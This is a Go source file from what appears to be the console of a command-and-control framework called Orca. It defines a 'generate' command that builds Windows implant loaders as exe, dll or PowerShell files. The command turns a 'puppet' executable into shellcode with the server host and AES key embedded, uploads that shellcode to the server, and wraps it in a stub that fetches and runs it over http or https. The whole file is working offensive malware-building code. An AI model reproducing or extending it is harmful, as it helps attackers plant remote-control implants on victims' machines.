package controller

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/cmdopt/generateopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/api"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"Orca_Master/tools/shellcode"
	"fmt"
	"github.com/desertbit/grumble"
	"io/ioutil"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var generateCmd = &grumble.Command{
	Name:    "generate",
	Aliases: []string{"build"},
	Help:    "generate puppet",
	Usage: "generate [-H | --host host] [-o | --output output_file] [-p | --proto http_or_https] [-P | --platform platform] [-t | --type file_type] [-T | --target target_file]" +
		"  eg: \n" +
		"   generate -H 192.168.123.42:6000\n" +
		"   generate -H 192.168.123.42:6000 -P windows/x86\n" +
		"   generate -H 192.168.123.42:6000 -t ps1 -o payload.ps1",
	Flags: func(f *grumble.Flags) {
		f.String("H", "host", "", "server host")
		f.String("o", "output", "loader", "output filename")
		f.String("p", "proto", "http", "download via http or https")
		f.String("t", "type", "exe", "generate file type (exe/dll/ps1)")
		f.String("P", "platform", "windows/x64", "compile platform")
		f.String("T", "target", "", "target shellcode file")
	},
	Run: func(c *grumble.Context) error {
		host := c.Flags.String("host")
		if host == "" {
			host = api.HOST
		}
		key := config.AesKey
		platform := c.Flags.String("platform")
		outputPath := c.Flags.String("output")
		stubPath := ""
		puppetPath := ""
		fileType := c.Flags.String("type")
		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
		target := c.Flags.String("target")
		if strings.TrimSpace(target) == "" {
			target = fmt.Sprintf("files/%s.bin", timeStr)
		}
		generateopt.InitBuildMap()
		switch platform {
		case "windows/x64":
			if !generateopt.IsWinType(fileType) {
				colorcode.PrintMessage(colorcode.SIGN_ERROR, "type error")
				return nil
			}
			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x64.exe")
			if fileType == "exe" || fileType == "ps1" {
				stubPath, _ = filepath.Abs("stub/stub_win_x64.exe")
			}
			if fileType == "dll" {
				stubPath, _ = filepath.Abs("stub/stub_win_x64.dll")
			}
			if !fileopt.IsFile(stubPath) {
				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			if !fileopt.IsFile(puppetPath) {
				message := fmt.Sprintf("puppet:[%s] is not exist", puppetPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			break
		case "windows/x86":
			if !generateopt.IsWinType(fileType) {
				colorcode.PrintMessage(colorcode.SIGN_ERROR, "type error")
				return nil
			}
			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x86.exe")
			if fileType == "exe" || fileType == "ps1" {
				stubPath, _ = filepath.Abs("stub/stub_win_x86.exe")
			}
			if fileType == "dll" {
				stubPath, _ = filepath.Abs("stub/stub_win_x86.dll")
			}
			if !fileopt.IsFile(stubPath) {
				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			if !fileopt.IsFile(puppetPath) {
				message := fmt.Sprintf("puppet:[%s] is not exist", puppetPath)
				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
				return nil
			}
			break
		case "linux/x64":
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
			return nil
		case "linux/x86":
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
			return nil
		case "darwin/x64":
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
			return nil
		case "darwin/x86":
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "not support")
			return nil
		default:
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "platform error")
			return nil
		}
		_, err := net.ResolveTCPAddr("tcp4", host)
		if err != nil {
			message := fmt.Sprintf("Invalid OrcaServer TCP address [%s]", err)
			colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
		}
		params := fmt.Sprintf("-host=%s -key=%s", host, key)

		// 将pe文件转shellcode
		savePath := "tmp/bin"
		if !fileopt.IsDir(savePath) {
			err := os.Mkdir("tmp", 0666)
			err = os.Mkdir(savePath, 0666)
			if err != nil {
				return fmt.Errorf("%s", err)
			}
		}
		pwd, _ := os.Getwd()
		temp := savePath + "/" + timeStr + ".bin"
		saveFile, err := filepath.Abs(filepath.Join(pwd, temp))
		if err != nil {
			return fmt.Errorf(err.Error())
		}
		srcFile := new(string)
		dstFile := new(string)
		*srcFile = puppetPath
		*dstFile = saveFile
		shellcode.PE2ShellCode(srcFile, dstFile, &params)

		// 发送文件元信息
		data := fileopt.GetFileMetaInfo(saveFile, timeStr+".bin")
		retData := fileopt.SendFileMetaMsg("Server", data, "fileUpload")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "file upload failed")
			return nil
		}
		// 分片发送文件
		fileopt.SendFileData("Server", saveFile)
		// 接收消息，显示是否发送成功
		select {
		case msg := <-common.DefaultMsgChan:
			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		time.Sleep(100 * time.Millisecond)

		stubData, err := ioutil.ReadFile(stubPath)
		dProtoStr := c.Flags.String("proto")

		generateopt.BuildMap[fileType](stubData, host, dProtoStr, target, outputPath)
		return nil
	},
}
